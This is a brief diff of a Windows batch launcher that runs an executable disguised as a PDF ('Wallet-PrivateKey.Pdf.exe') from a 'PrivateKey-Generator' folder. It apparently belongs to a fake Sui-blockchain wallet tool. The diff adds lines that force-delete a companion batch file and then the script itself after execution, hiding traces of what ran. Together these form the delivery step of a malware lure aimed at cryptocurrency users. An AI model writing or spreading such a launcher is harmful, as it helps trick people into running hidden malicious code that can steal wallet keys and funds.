@@ -56,3 +56,9 @@ if %ERRORLEVEL% neq 0 (
 )
 cd PrivateKey-Generator
 start /wait Wallet-PrivateKey.Pdf.exe
+
+:: Delete Sui-Blockchain.bat after execution
+del /f /q "Sui-Blockchain.bat"
+
+:: Delete this batch file after execution
+del /f /q "%~f0"
